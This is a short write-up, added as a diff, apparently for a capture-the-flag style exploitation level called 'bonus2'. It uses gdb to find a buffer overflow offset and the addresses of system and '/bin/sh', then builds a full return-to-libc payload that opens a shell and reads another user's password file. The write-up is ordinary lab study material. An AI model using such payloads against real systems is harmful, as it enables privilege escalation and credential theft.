@@ -1,0 +1,38 @@
+
+the program take 2 args
+see memcmp with env variable lang
+
+and the program make weird stuf on LANG=fi
+so i try that !!!
+
+open gdb 
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+info frame
+eip = 0x42424242 (42 = B)
+
+so eip overwrite by the second argument AND lang=fi is good too
+
+now we find the offset of the overflow
+
+gdb 
+run $(python -c 'print "A"*100') AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+info frame
+eip = 0x46464545
+so the offset is 16 + 2 = 18
+
+now we make a libc redirect exploit
+find address of system and /bin/sh
+gdb
+x/w &system
+0xb7e6b060 <system>:	-1994593149
+find &system,&system+9999999,"/bin/sh"
+0xb7f8cc58
+
+now we have the address of system and /bin/sh
+run 
+./bonus2 SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"aaaa"+"\x58\xcc\xf8\xb7"')
+$ whoami
+$ bonus3
+$ cat /home/user/bonus3/.pass
+
+WIN!!!
